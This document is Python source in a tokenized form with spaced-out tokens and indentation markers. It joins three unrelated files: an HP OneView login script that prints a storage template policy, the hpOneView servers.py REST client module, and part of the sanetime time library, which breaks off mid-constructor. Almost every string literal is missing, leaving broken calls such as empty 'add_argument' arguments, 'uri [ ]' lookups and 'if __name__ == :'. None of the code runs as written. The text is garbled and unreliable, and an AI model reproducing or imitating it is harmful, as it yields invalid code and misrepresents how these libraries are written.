~~ from __future__ import print_function \n 
from __future__ import unicode_literals \n 
from __future__ import division \n 
from __future__ import absolute_import \n 
from builtins import range \n 
from future import standard_library \n 
standard_library . install_aliases ( ) \n 
import sys \n 
\n 
PYTHON_VERSION = sys . version_info [ : 3 ] \n 
PY2 = ( PYTHON_VERSION [ 0 ] == 2 ) \n 
if PY2 : \n 
~~~ if PYTHON_VERSION < ( 2 , 7 , 9 ) : \n 
~~~ raise Exception ( ) \n 
~~ ~~ elif PYTHON_VERSION < ( 3 , 4 ) : \n 
~~~ raise Exception ( ) \n 
\n 
~~ import hpOneView as hpov \n 
from pprint import pprint \n 
\n 
\n 
def acceptEULA ( con ) : \n 
# See if we need to accept the EULA before we try to log in \n 
~~~ con . get_eula_status ( ) \n 
try : \n 
~~~ if con . get_eula_status ( ) is True : \n 
~~~ print ( ) \n 
con . set_eula ( ) \n 
~~ ~~ except Exception as e : \n 
~~~ print ( ) \n 
print ( e ) \n 
\n 
\n 
~~ ~~ def login ( con , credential ) : \n 
# Login with givin credentials \n 
~~~ try : \n 
~~~ con . login ( credential ) \n 
~~ except : \n 
~~~ print ( ) \n 
\n 
\n 
~~ ~~ def getpolicy ( sts ) : \n 
~~~ policy = sts . get_storage_vol_template_policy ( ) \n 
print ( policy [ ] ) \n 
\n 
\n 
~~ def main ( ) : \n 
~~~ parser = argparse . ArgumentParser ( add_help = True , \n 
formatter_class = argparse . RawTextHelpFormatter , \n 
description = ) \n 
parser . add_argument ( , dest = , required = True , \n 
help = ) \n 
parser . add_argument ( , dest = , required = False , \n 
default = , \n 
help = ) \n 
parser . add_argument ( , dest = , required = True , \n 
help = ) \n 
parser . add_argument ( , dest = , required = False , \n 
help = ) \n 
parser . add_argument ( , dest = , required = False , \n 
help = ) \n 
parser . add_argument ( , dest = , required = False , \n 
default = , \n 
help = ) \n 
\n 
args = parser . parse_args ( ) \n 
credential = { : args . domain . upper ( ) , : args . user , : args . passwd } \n 
\n 
con = hpov . connection ( args . host ) \n 
sts = hpov . settings ( con ) \n 
\n 
if args . proxy : \n 
~~~ con . set_proxy ( args . proxy . split ( ) [ 0 ] , args . proxy . split ( ) [ 1 ] ) \n 
~~ if args . cert : \n 
~~~ con . set_trusted_ssl_bundle ( args . cert ) \n 
\n 
~~ login ( con , credential ) \n 
acceptEULA ( con ) \n 
\n 
getpolicy ( sts ) \n 
\n 
~~ if __name__ == : \n 
~~~ import sys \n 
import argparse \n 
sys . exit ( main ( ) ) \n 
\n 
# vim:set shiftwidth=4 tabstop=4 expandtab textwidth=79: \n 
# -*- coding: utf-8 -*- \n 
\n 
~~ """\nservers.py\n~~~~~~~~~~~~\n\nThis module implements servers HP OneView REST API\n""" \n 
from __future__ import unicode_literals \n 
from __future__ import print_function \n 
from __future__ import division \n 
from __future__ import absolute_import \n 
from future import standard_library \n 
standard_library . install_aliases ( ) \n 
from pprint import pprint \n 
\n 
__title__ = \n 
__version__ = \n 
__copyright__ = \n 
__license__ = \n 
__status__ = \n 
\n 
### \n 
# (C) Copyright (2012-2015) Hewlett Packard Enterprise Development LP \n 
# \n 
# Permission is hereby granted, free of charge, to any person obtaining a copy \n 
# of this software and associated documentation files (the "Software"), to deal \n 
# in the Software without restriction, including without limitation the rights \n 
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell \n 
# copies of the Software, and to permit persons to whom the Software is \n 
# furnished to do so, subject to the following conditions: \n 
# \n 
# The above copyright notice and this permission notice shall be included in \n 
# all copies or substantial portions of the Software. \n 
# \n 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR \n 
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, \n 
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE \n 
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER \n 
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, \n 
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN \n 
# THE SOFTWARE. \n 
### \n 
\n 
from hpOneView . common import * \n 
from hpOneView . connection import * \n 
from hpOneView . activity import * \n 
from hpOneView . exceptions import * \n 
\n 
class servers ( object ) : \n 
\n 
~~~ def __init__ ( self , con ) : \n 
~~~ self . _con = con \n 
self . _activity = activity ( con ) \n 
\n 
########################################################################### \n 
# Connections \n 
########################################################################### \n 
\n 
~~ def get_connections ( self , filter = ) : \n 
~~~ """ List all the active connections\n\n            Args:\n                filter:\n                    A general filter/query string that narrows the list of\n                    resources returned by a multi-resource GET (read) request and\n                    DELETE (delete) request. The default is no filter\n                    (all resources are returned). The filter parameter specifies\n                    a general filter/query string. This query string narrows the\n                    selection of resources returned from a GET request that\n                    returns a list of resources. The following example shows how to\n                    retrieve only the first 10 connections:\n\n            Returns: all the connections, filtered or not.\n            """ \n 
return get_members ( self . _con . get ( uri [ ] + filter ) ) \n 
\n 
~~ def get_connection ( self , server ) : \n 
~~~ """ List a specific connection\n\n            Args:\n                server:\n                    Connection id\n\n            Returns: all the connections, filtered or not.\n        """ \n 
body = self . _con . get ( server [ ] ) \n 
return body \n 
\n 
########################################################################### \n 
# Server Hardware \n 
########################################################################### \n 
~~ def get_server_by_bay ( self , baynum ) : \n 
~~~ servers = get_members ( self . _con . get ( uri [ ] ) ) \n 
for server in servers : \n 
~~~ if server [ ] == baynum : \n 
~~~ return server \n 
\n 
~~ ~~ ~~ def get_server_by_name ( self , name ) : \n 
~~~ servers = get_members ( self . _con . get ( uri [ ] ) ) \n 
for server in servers : \n 
~~~ if server [ ] == name : \n 
~~~ return server \n 
\n 
~~ ~~ ~~ def get_available_servers ( self , server_hardware_type = None , \n 
enclosure_group = None , server_profile = None ) : \n 
~~~ filters = [ ] \n 
if server_hardware_type : \n 
~~~ filters . append ( + server_hardware_type [ ] ) \n 
~~ if enclosure_group : \n 
~~~ filters . append ( + enclosure_group [ ] ) \n 
~~ if server_profile : \n 
~~~ filters . append ( + server_profile [ ] ) \n 
\n 
~~ query_string = \n 
if filters : \n 
~~~ query_string = + . join ( filters ) \n 
\n 
~~ return self . _con . get ( uri [ ] + query_string ) \n 
\n 
~~ def get_servers ( self ) : \n 
~~~ return get_members ( self . _con . get ( uri [ ] ) ) \n 
\n 
~~ def get_utilization ( self , server ) : \n 
~~~ """Retrieves historical utilization data for the specified resource, metrics, and time span. """ \n 
body = self . _con . get ( server [ ] + ) \n 
return body \n 
\n 
~~ def get_env_conf ( self , server ) : \n 
~~~ """Gets the settings that describe the environmental configuration of the server hardware resource. """ \n 
body = self . _con . get ( server [ ] + ) \n 
return body \n 
\n 
~~ def set_server_powerstate ( self , server , state , force = False , blocking = True , \n 
verbose = False ) : \n 
~~~ if state == and force is True : \n 
~~~ powerRequest = make_powerstate_dict ( , ) \n 
~~ elif state == and force is False : \n 
~~~ powerRequest = make_powerstate_dict ( , ) \n 
~~ elif state == : \n 
~~~ powerRequest = make_powerstate_dict ( , ) \n 
~~ elif state == : \n 
~~~ powerRequest = make_powerstate_dict ( , ) \n 
~~ task , body = self . _con . put ( server [ ] + , powerRequest ) \n 
if blocking is True : \n 
~~~ task = self . _activity . wait4task ( task , tout = 60 , verbose = verbose ) \n 
~~ return task \n 
\n 
~~ def delete_server ( self , server , force = False , blocking = True , verbose = False ) : \n 
~~~ if force : \n 
~~~ task , body = self . _con . delete ( server [ ] + ) \n 
~~ else : \n 
~~~ task , body = self . _con . delete ( server [ ] ) \n 
~~ if blocking is True : \n 
~~~ task = self . _activity . wait4task ( task , tout = 600 , verbose = verbose ) \n 
~~ return task \n 
\n 
~~ def update_server ( self , server ) : \n 
~~~ task , body = self . _con . put ( server [ ] , server ) \n 
return body \n 
\n 
~~ def add_server ( self , server , blocking = True , verbose = False ) : \n 
~~~ task , body = self . _con . post ( uri [ ] , server ) \n 
if blocking is True : \n 
~~~ task = self . _activity . wait4task ( task , tout = 600 , verbose = verbose ) \n 
if in task and task [ ] . startswith ( ) : \n 
~~~ entity = self . _activity . get_task_associated_resource ( task ) \n 
server = self . _con . get ( entity [ ] ) \n 
return server \n 
~~ ~~ return task \n 
\n 
~~ def get_server_schema ( self ) : \n 
~~~ """ Gets the JSON schema of the server hardware resource.""" \n 
return self . _con . get ( uri [ ] + ) \n 
\n 
~~ def get_bios ( self , server ) : \n 
~~~ """ Gets the list of BIOS/UEFI values currently set on the physical server.""" \n 
return self . _con . get ( server [ ] + ) \n 
\n 
~~ def get_ilo_sso_url ( self , server ) : \n 
~~~ """ Retrieves the URL to launch a Single Sign-On (SSO) session for the iLO web interface.""" \n 
return self . _con . get ( server [ ] + ) \n 
\n 
~~ def get_java_remote_console_url ( self , server ) : \n 
~~~ """ Generates a Single Sign-On (SSO) session for the iLO Java Applet console and returns\n        the URL to launch it. """ \n 
return self . _con . get ( server [ ] + ) \n 
\n 
~~ def get_remote_console_url ( self , server ) : \n 
~~~ """ Generates a Single Sign-On (SSO) session for the iLO Integrated Remote Console Application\n        (IRC) and returns the URL to launch it.""" \n 
return self . _con . get ( server [ ] + ) \n 
\n 
########################################################################### \n 
# Server Hardware Types \n 
########################################################################### \n 
~~ def get_server_hardware_types ( self ) : \n 
~~~ """ Get the list of server hardware type resources defined on the appliance.""" \n 
body = self . _con . get ( uri [ ] ) \n 
return get_members ( body ) \n 
\n 
~~ def remove_server_hardware_type ( self , server_hardware_type , force = False , blocking = True , verbose = False ) : \n 
~~~ """ Remove the server hardware type with the specified URI. A server hardware type cannot be deleted\n         if it is associated with a server hardware or server profile resource. """ \n 
if force : \n 
~~~ task , body = self . _con . delete ( server_hardware_type [ ] + ) \n 
~~ else : \n 
~~~ task , body = self . _con . delete ( server_hardware_type [ ] ) \n 
~~ if blocking is True : \n 
~~~ task = self . _activity . wait4task ( task , tout = 600 , verbose = verbose ) \n 
~~ return task \n 
\n 
~~ def get_server_type_schema ( self ) : \n 
~~~ """ Get the JSON schema of the server hardware types resource.""" \n 
return self . _con . get ( uri [ ] + ) \n 
\n 
~~ def get_server_hardware_type ( self , server_type ) : \n 
~~~ """ Get the server hardware type resource with the specified ID.""" \n 
return self . _con . get ( server_type [ ] ) \n 
\n 
~~ def set_server_hardware_type ( self , server_hardware_type , name , description ) : \n 
~~~ """ Updates one or more attributes for a server hardware type resource.\n\n        Args:\n            name:\n                 The localized name that describes a BIOS/UEFI setting.\n            description:\n                 Brief description of the server hardware type.\n                    Maximum Length: 255\n                    Minimum Length: 0\n        """ \n 
request = make_server_type_dict ( name , description ) \n 
task , body = self . _con . put ( server_hardware_type [ ] , request ) \n 
return task \n 
\n 
########################################################################### \n 
# Server Profiles \n 
########################################################################### \n 
~~ def create_server_profile ( self , \n 
affinity = , \n 
biosSettings = None , \n 
bootSettings = None , \n 
bootModeSetting = None , \n 
profileConnectionV4 = None , \n 
description = None , \n 
firmwareSettingsV3 = None , \n 
hideUnusedFlexNics = True , \n 
localStorageSettingsV3 = None , \n 
macType = , \n 
name = None , \n 
sanStorageV3 = None , \n 
serialNumber = None , \n 
serialNumberType = , \n 
serverHardwareTypeUri = None , \n 
serverHardwareUri = None , \n 
serverProfileTemplateUri = None , \n 
uuid = None , \n 
wwnType = , \n 
blocking = True , verbose = False ) : \n 
~~~ """ Create a ServerProfileV5 profile for use with the V200 API\n\n        Args:\n            affinity:\n                This identifies the behavior of the server profile when the server\n                hardware is removed or replaced. This can be set to \'Bay\' or\n                \'BayAndServer\'.\n            biosSettings:\n                Dictionary that describes Server BIOS settings\n            bootSettings:\n                Dictionary that indicates that the server will attempt to boot from\n                this connection. This object can only be specified if\n                "boot.manageBoot" is set to \'true\'\n            bootModeSetting:\n                Dictionary that describes the boot mode settings to be configured on\n                Gen9 and newer servers.\n            profileConnectionV4:\n                Array of ProfileConnectionV3\n            description:\n                Description of the Server Profile\n            firmwareSettingsV3:\n                FirmwareSettingsV3 dictionary that defines the firmware baseline\n                and management\n            hideUnusedFlexNics:\n                This setting controls the enumeration of physical functions that do\n                not correspond to connections in a profile.\n            localStorageSettingsV3:\n                Dictionary that describes the local storage settings.\n            macType:\n                Specifies the type of MAC address to be programmed into the IO\n                devices. The value can be \'Virtual\', \'Physical\' or \'UserDefined\'.\n            name:\n                Unique name of the Server Profile\n            sanStorageV3:\n                Dictionary that describes the SAN storage settings.\n            serialNumber:\n                A 10-byte value that is exposed to the Operating System as the\n                server hardware\'s Serial Number. The value can be a virtual serial\n                number, user defined serial number or physical serial number read\n                from the server\'s ROM. It cannot be modified after the profile is\n                created.\n            serialNumberType:\n                 Specifies the type of Serial Number and UUID to be programmed into\n                 the server ROM. The value can be \'Virtual\', \'UserDefined\', or\n                 \'Physical\'. The serialNumberType defaults to \'Virtual\' when\n                 serialNumber or uuid are not specified. It cannot be modified\n                 after the profile is created.\n            serverHardwareTypeUri:\n                Identifies the server hardware type for which the Server Profile\n                was designed. The serverHardwareTypeUri is determined when the\n                profile is created.\n            serverHardwareUri:\n                 Identifies the server hardware to which the server profile is\n                 currently assigned, if applicable\n            serverProfileTemplateUri:\n                Identifies the Server profile template the Server Profile is based\n                on.\n            uuid:\n                A 36-byte value that is exposed to the Operating System as the\n                server hardware\'s UUID. The value can be a virtual uuid, user\n                defined uuid or physical uuid read from the server\'s ROM. It\n                cannot be modified after the profile is created.\n            wwnType:\n                 Specifies the type of WWN address to be programmed into the IO\n                 devices. The value can be \'Virtual\', \'Physical\' or \'UserDefined\'.\n                 It cannot be modified after the profile is created.\n\n        Returns: server profile or task\n        """ \n 
\n 
# Creating a profile returns a task with no resource uri \n 
profile = make_ServerProfileV5 ( affinity , biosSettings , bootSettings , \n 
bootModeSetting , profileConnectionV4 , \n 
description , firmwareSettingsV3 , \n 
hideUnusedFlexNics , \n 
localStorageSettingsV3 , macType , name , \n 
sanStorageV3 , serialNumber , \n 
serialNumberType , serverHardwareTypeUri , \n 
serverHardwareUri , \n 
serverProfileTemplateUri , uuid , wwnType ) \n 
task , body = self . _con . post ( uri [ ] , profile ) \n 
if profile [ ] is None : \n 
~~~ tout = 600 \n 
~~ else : \n 
~~~ tout = 3600 \n 
~~ if blocking is True : \n 
~~~ task = self . _activity . wait4task ( task , tout , verbose = verbose ) \n 
if in task and task [ ] . startswith ( ) : \n 
~~~ entity = self . _activity . get_task_associated_resource ( task ) \n 
profile = self . _con . get ( entity [ ] ) \n 
return profile \n 
~~ ~~ return task \n 
\n 
\n 
~~ def post_server_profile ( self , profile , blocking = True , verbose = False ) : \n 
~~~ """ POST a ServerProfileV5 profile for use with the V200 API\n\n        Args:\n            profile:\n                ServerProfileV5\n\n        Returns: server profile or task\n        """ \n 
\n 
task , body = self . _con . post ( uri [ ] , profile ) \n 
if profile [ ] is None : \n 
~~~ tout = 600 \n 
~~ else : \n 
~~~ tout = 3600 \n 
~~ if blocking is True : \n 
~~~ task = self . _activity . wait4task ( task , tout , verbose = verbose ) \n 
if in task and task [ ] . startswith ( ) : \n 
~~~ entity = self . _activity . get_task_associated_resource ( task ) \n 
profile = self . _con . get ( entity [ ] ) \n 
return profile \n 
~~ ~~ return task \n 
\n 
\n 
~~ def remove_server_profile ( self , profile , force = False , blocking = True , verbose = False ) : \n 
~~~ if force : \n 
~~~ task , body = self . _con . delete ( profile [ ] + ) \n 
~~ else : \n 
~~~ task , body = self . _con . delete ( profile [ ] ) \n 
~~ if blocking is True : \n 
~~~ task = self . _activity . wait4task ( task , tout = 600 , verbose = verbose ) \n 
~~ return task \n 
\n 
~~ def get_server_profiles ( self ) : \n 
~~~ body = self . _con . get ( uri [ ] ) \n 
return get_members ( body ) \n 
\n 
~~ def update_server_profile ( self , profile , blocking = True , verbose = False ) : \n 
~~~ task , body = self . _con . put ( profile [ ] , profile ) \n 
try : \n 
~~~ if profile [ ] [ ] is None : \n 
~~~ tout = 600 \n 
~~ else : \n 
~~~ tout = 3600 \n 
~~ ~~ except Exception : \n 
~~~ tout = 600 \n 
# Update the task to get the associated resource uri \n 
~~ if blocking is True : \n 
~~~ task = self . _activity . wait4task ( task , tout = tout , verbose = verbose ) \n 
~~ profileResource = self . _activity . get_task_associated_resource ( task ) \n 
profile = self . _con . get ( profileResource [ ] ) \n 
return profile \n 
\n 
~~ def update_server_profile_from_template ( self , profile , blocking = True , verbose = False ) : \n 
~~~ patch_request = [ { : , : , : } ] \n 
task , body = self . _con . patch ( profile [ ] , patch_request ) \n 
try : \n 
~~~ if profile [ ] [ ] is None : \n 
~~~ tout = 600 \n 
~~ else : \n 
~~~ tout = 3600 \n 
~~ ~~ except Exception : \n 
~~~ tout = 600 \n 
# Update the task to get the associated resource uri \n 
if blocking is True : \n 
~~~ task = self . _activity . wait4task ( task , tout = tout , verbose = verbose ) \n 
~~ profileResource = self . _activity . get_task_associated_resource ( task ) \n 
profile = self . _con . get ( profileResource [ ] ) \n 
return profile \n 
\n 
~~ ~~ def get_server_profile_by_name ( self , name ) : \n 
~~~ body = self . _con . get_entity_byfield ( uri [ ] , , name ) \n 
return body \n 
\n 
~~ def get_profile_message ( self , profile ) : \n 
~~~ """ Retrieve the error or status messages associated with the specified profile. """ \n 
message = self . _con . get ( profile [ ] + ) \n 
return message \n 
\n 
~~ def get_profile_compliance_preview ( self , profile ) : \n 
~~~ """ Gets the preview of manual and automatic updates required to make the\n        server profile consistent with its template. """ \n 
return self . _con . get ( profile [ ] + ) \n 
\n 
########################################################################### \n 
# Server Profile Templates \n 
########################################################################### \n 
~~ def create_server_profile_template ( \n 
self , \n 
name = None , \n 
description = None , \n 
serverProfileDescription = None , \n 
serverHardwareTypeUri = None , \n 
enclosureGroupUri = None , \n 
affinity = None , \n 
hideUnusedFlexNics = None , \n 
profileConnectionV4 = None , \n 
firmwareSettingsV3 = None , \n 
bootSettings = None , \n 
bootModeSetting = None , \n 
blocking = True , \n 
verbose = False ) : \n 
~~~ """\n        Create a ServerProfileTemplateV1 dictionary for use with the V200 API\n        Args:\n            name:\n                Unique name of the Server Profile Template\n            description:\n                Description of the Server Profile Template\n            serverProfileDescription:\n                The description of the server profiles created from this template.\n            serverHardwareTypeUri:\n                Identifies the server hardware type for which the Server Profile\n                was designed. The serverHardwareTypeUri is determined when the\n                profile is created.\n            enclosureGroupUri:\n                 Identifies the enclosure group for which the Server Profile Template\n                 was designed. The enclosureGroupUri is determined when the profile\n                 template is created and cannot be modified.\n            affinity:\n                This identifies the behavior of the server profile when the server\n                hardware is removed or replaced. This can be set to \'Bay\' or\n                \'BayAndServer\'.\n            hideUnusedFlexNics:\n                This setting controls the enumeration of physical functions that do\n                not correspond to connections in a profile.\n            profileConnectionV4:\n                An array of profileConnectionV4\n            firmwareSettingsV3:\n                FirmwareSettingsV3 dictionary that defines the firmware baseline\n                and management.\n            bootSettings:\n                Dictionary that indicates that the server will attempt to boot from\n                this connection. This object can only be specified if\n                "boot.manageBoot" is set to \'true\'\n            bootModeSetting:\n                Dictionary that describes the boot mode settings to be configured on\n                Gen9 and newer servers.\n\n        Returns: dict\n        """ \n 
profile_template = make_ServerProfileTemplateV1 ( name , \n 
description , \n 
serverProfileDescription , \n 
serverHardwareTypeUri , \n 
enclosureGroupUri , \n 
affinity , \n 
hideUnusedFlexNics , \n 
profileConnectionV4 , \n 
firmwareSettingsV3 , \n 
bootSettings , \n 
bootModeSetting ) \n 
\n 
task , body = self . _con . post ( uri [ ] , profile_template ) \n 
tout = 600 \n 
if blocking is True : \n 
~~~ task = self . _activity . wait4task ( task , tout , verbose = verbose ) \n 
if in task and task [ ] . startswith ( ) : \n 
~~~ entity = self . _activity . get_task_associated_resource ( task ) \n 
profile_template = self . _con . get ( entity [ ] ) \n 
return profile_template \n 
~~ ~~ return task \n 
\n 
~~ def remove_server_profile_template ( self , profile_template , blocking = True , verbose = False ) : \n 
~~~ task , body = self . _con . delete ( profile_template [ ] ) \n 
if blocking is True : \n 
~~~ task = self . _activity . wait4task ( task , tout = 600 , verbose = verbose ) \n 
return task \n 
~~ return body \n 
\n 
~~ def get_server_profile_templates ( self ) : \n 
~~~ body = self . _con . get ( uri [ ] ) \n 
return get_members ( body ) \n 
\n 
~~ def get_server_profile_template_by_name ( self , name ) : \n 
~~~ body = self . _con . get_entity_byfield ( uri [ ] , , name ) \n 
return body \n 
\n 
~~ def update_server_profile_template ( self , profile_template , blocking = True , verbose = False ) : \n 
~~~ task , body = self . _con . put ( profile_template [ ] , profile_template ) \n 
tout = 600 \n 
# Update the task to get the associated resource uri \n 
if blocking is True : \n 
~~~ task = self . _activity . wait4task ( task , tout = tout , verbose = verbose ) \n 
~~ profileTemplateResource = self . _activity . get_task_associated_resource ( task ) \n 
profile = self . _con . get ( profileTemplateResource [ ] ) \n 
return profile_template \n 
\n 
~~ def get_server_profile_from_template ( self , profile_template ) : \n 
~~~ profile = self . _con . get ( profile_template [ ] + ) \n 
return profile \n 
\n 
########################################################################### \n 
# Enclosures \n 
########################################################################### \n 
~~ def get_enclosures ( self ) : \n 
~~~ body = self . _con . get ( uri [ ] ) \n 
return get_members ( body ) \n 
\n 
~~ def add_enclosure ( self , enclosure , blocking = True , verbose = False ) : \n 
~~~ task , body = self . _con . post ( uri [ ] , enclosure ) \n 
if enclosure [ ] is : \n 
~~~ tout = 600 \n 
~~ elif enclosure [ ] is None : \n 
~~~ tout = 600 \n 
~~ else : \n 
~~~ tout = 3600 \n 
\n 
~~ if blocking is True : \n 
~~~ task = self . _activity . wait4task ( task , tout , verbose = verbose ) \n 
if in task and task [ ] . startswith ( ) : \n 
~~~ entity = self . _activity . get_task_associated_resource ( task ) \n 
enclosure = self . _con . get ( entity [ ] ) \n 
return enclosure \n 
~~ ~~ return task \n 
\n 
~~ def remove_enclosure ( self , enclosure , force = False , blocking = True , \n 
verbose = False ) : \n 
~~~ if force : \n 
~~~ task , body = self . _con . delete ( enclosure [ ] + ) \n 
~~ else : \n 
~~~ task , body = self . _con . delete ( enclosure [ ] ) \n 
~~ if blocking is True : \n 
~~~ task = self . _activity . wait4task ( task , tout = 600 , verbose = verbose ) \n 
~~ return task \n 
\n 
########################################################################### \n 
# Enclosure Groups \n 
########################################################################### \n 
~~ def create_enclosure_group ( self , associatedLIGs , name , \n 
powerMode = ) : \n 
~~~ """ Create an EnclosureGroupV200 dictionary\n\n        Args:\n            associatedLIGs:\n                A sorted list of logical interconnect group URIs associated with\n                the enclosure group.\n            name:\n                The name of the enclosure group.\n            powerMode:\n                Power mode of the enclosure group. Values are \'RedundantPowerFeed\'\n                or \'RedundantPowerSupply\'.\n\n        Returns: enclosure group\n        """ \n 
egroup = make_EnclosureGroupV200 ( associatedLIGs , name , powerMode ) \n 
# Creating an Enclosure Group returns the group, NOT a task \n 
task , body = self . _con . post ( uri [ ] , egroup ) \n 
return body \n 
\n 
~~ def delete_enclosure_group ( self , egroup ) : \n 
~~~ self . _con . delete ( egroup [ ] ) \n 
\n 
~~ def get_enclosure_groups ( self ) : \n 
~~~ return get_members ( self . _con . get ( uri [ ] ) ) \n 
\n 
~~ def update_enclosure_group ( self , enclosuregroup ) : \n 
~~~ task , body = self . _con . put ( enclosuregroup [ ] , enclosuregroup ) \n 
return body \n 
\n 
########################################################################### \n 
# ID Pools \n 
########################################################################### \n 
~~ def get_pool ( self , pooltype ) : \n 
~~~ body = self . _con . get ( uri [ ] + + pooltype ) \n 
return body \n 
\n 
~~ def get_vmac_pool ( self ) : \n 
~~~ body = self . _con . get ( uri [ ] ) \n 
return body \n 
\n 
~~ def get_vwwn_pool ( self ) : \n 
~~~ body = self . _con . get ( uri [ ] ) \n 
return body \n 
\n 
~~ def get_vsn_pool ( self ) : \n 
~~~ body = self . _con . get ( uri [ ] ) \n 
return body \n 
\n 
~~ def get_profile_networks ( self ) : \n 
~~~ body = self . _con . get ( uri [ ] ) \n 
return body \n 
\n 
~~ def get_profile_schema ( self ) : \n 
~~~ return self . _con . get ( uri [ ] ) \n 
\n 
~~ def get_profile_available_servers ( self ) : \n 
~~~ body = self . _con . get ( uri [ ] ) \n 
return body \n 
\n 
~~ def get_profile_available_storage_systems ( self ) : \n 
~~~ body = self . _con . get ( uri [ ] ) \n 
return body \n 
\n 
~~ def get_profile_ports ( self ) : \n 
~~~ body = self . _con . get ( uri [ ] ) \n 
return body \n 
\n 
# TODO put pool \n 
~~ def allocate_pool_ids ( self , url , count ) : \n 
~~~ allocatorUrl = % url \n 
allocatorBody = { : count } \n 
task , body = self . _con . put ( allocatorUrl , allocatorBody ) \n 
return body \n 
\n 
~~ def release_pool_ids ( self , url , idList ) : \n 
~~~ collectorUrl = % url \n 
collectorBody = { : idList } \n 
task , body = self . _con . put ( collectorUrl , collectorBody ) \n 
return body \n 
\n 
~~ def allocate_range_ids ( self , allocatorUrl , count ) : \n 
~~~ task , body = self . _con . put ( allocatorUrl , { : count } ) \n 
return body \n 
\n 
~~ def release_range_ids ( self , collectorUrl , idList ) : \n 
~~~ task , body = self . _con . put ( collectorUrl , { : idList } ) \n 
return body \n 
\n 
# TODO POST Range \n 
~~ def enable_range ( self , url ) : \n 
~~~ prange = self . _con . get ( url ) \n 
prange [ ] = True \n 
task , body = self . _con . put ( url , prange ) \n 
return body \n 
\n 
~~ def disable_range ( self , url ) : \n 
~~~ prange = self . _con . get ( url ) \n 
prange [ ] = False \n 
task , body = self . _con . put ( url , prange ) \n 
return body \n 
\n 
# vim:set shiftwidth=4 tabstop=4 expandtab textwidth=79: \n 
~~ ~~ from . constants import MILLI_MICROS , SECOND_MICROS , MINUTE_MICROS \n 
import calendar \n 
from datetime import datetime \n 
from dateutil import parser \n 
from dateutil . tz import tzlocal \n 
from . error import TimeConstructionError \n 
from . sanedelta import SaneDelta \n 
import pytz \n 
\n 
\n 
#TODO: ensure that this is immutable, and that addiiton,etc always producesa  new object!!! \n 
\n 
MICROS_TRANSLATIONS = ( \n 
( ( , , , , ) , MINUTE_MICROS ) , \n 
( ( , , , , ) , SECOND_MICROS ) , \n 
( ( , , , , ) , MILLI_MICROS ) , \n 
( ( , , , , ) , 1 ) ) \n 
MICROS_TRANSLATION_HASH = dict ( ( alt , v ) for k , v in MICROS_TRANSLATIONS for alt in k ) \n 
\n 
class SaneTime ( object ) : \n 
~~~ """\n    A time stored in epoch microseconds, and optionally decorated with a timezone.\n    An object of this class represents a moment in time.\n    A moment in time experience in America/New_York is equal to the same moment in time experienced in Europe/Dublin\n    """ \n 
\n 
\n 
\n 
"""\n    Why not store in millis or seconds?\n    datetime stores things in micros, and since millis already crosses over the 32bit boundary, we\n    might as well store everything we got in the 64 bit numbers.  This will force 32bit machines to\n    go to long\'s, so maybe a little reduced performance there, but isn\'t everything on 64 bit now?\n    This also avoids the unexpected scenario where two different datetimes would compare as equal\n    when they were converted to sanetimes.  As to why-not-seconds, well that\'s just lame.  You can\n    easily go to seconds or millis from sanetime by using the .s or .ms properties.\n\n    When you do arithmetic with sanetime you are operating on microseconds.  st + 1 creates a new\n    sanetime that is 1 microsecond in the future from the st sanetime.\n\n    When you do comparisons, all comparisons are happening at the microsecond level.  You are\n    comparing microseconds in time.\n    """ \n 
\n 
def __init__ ( self , * args , ** kwargs ) : \n 
~~~ """\n        acceptable arg inputs:\n          1) epoch micros integer (or int like)\n          2) a datetime\n            NOTE!! a naive datetime is assumed to be in UTC, unless you tell this\n            method otherwise by also passing in a tz paramter.  A timezoned datetime is \n            preserved with the timezone it has\n          3) a string representation that the dateutil parser can deal with\n          4) multiple args just as datetime would accept\n\n        acceptable keyworded inputs:\n          1) us = an int/long in epoch micros\n          2) ms = an int/long in epoch millis\n          3) s = an int/long in epoch seconds\n          4) m = an int/long in epoch minutes\n          5) tz = a timezone (either a pytz timezone object, a recognizeable pytz timezone string, or a dateutil tz object)\n        """ \n 
super ( time , self ) . __init__ ( ) \n 
uss = set ( ) \n 
tzs = set ( ) \n 
naive_dt = None \n 
avoid_localize = False \n 
\n 
for k , v in kwargs . iteritems ( ) : \n 
~~~ if k in ( , ) : \n 
~~~ tzs . add ( SaneTime . to_timezone ( v ) ) \n 
~~ elif k in MICROS_TRANSLATION_HASH : \n 
~~~ uss . add ( MICROS_TRANSLATION_HASH [ k ] * v ) \n 
~~ else : \n 
~~~ raise TimeConstructionError ( "Unexpected kwarg in SaneTime constructor! (%s = %s)" % ( k , v ) ) \n 
\n 
~~ ~~ args = list ( args ) \n 
if len ( args ) > 2 and len ( args ) <= 8 : \n 
~~~ args = [ datetime ( * args ) ] \n 
~~ if len ( args ) == 2 : \n 
~~~ tzs . add ( SaneTime . to_timezone ( args . pop ( ) ) ) \n 
~~ if len ( args ) == 1 : \n 
#            import pdb; pdb.set_trace() \n 
~~~ arg = args . pop ( ) \n 
if hasattr ( arg , ) : \n 
~~~ uss . add ( int ( arg ) ) \n 
if hasattr ( arg , ) : tzs . add ( arg . tz ) \n 
~~ elif isinstance ( arg , basestring ) : \n 
~~~ parts = arg . strip ( ) . split ( ) \n 
if len ( parts ) > 1 and parts [ - 1 ] . startswith ( ) : \n 
~~~ try : \n 
~~~ tzs . add ( SaneTime . to_timezone ( parts [ - 1 ] [ 1 : ] ) ) \n 
arg = . join ( parts [ : - 1 ] ) \n 
~~ except : pass \n 
~~ utc = arg . endswith ( ) or arg . endswith ( ) \n 
arg = parser . parse ( arg ) \n 
if arg . tzinfo : # parsed timezones are a special breed of retard \n 
~~~ if utc : \n 
~~~ tzs . add ( pytz . utc ) \n 
arg = arg . replace ( tzinfo = None ) \n 
~~ elif isinstance ( arg . tzinfo , tzlocal ) : # in case the parser decides to use tzlocal instead of a tzoffset \n 
~~~ arg = arg . replace ( tzinfo = None ) \n 
~~ else : \n 
\n 
~~~ avoid_localize = True \n 
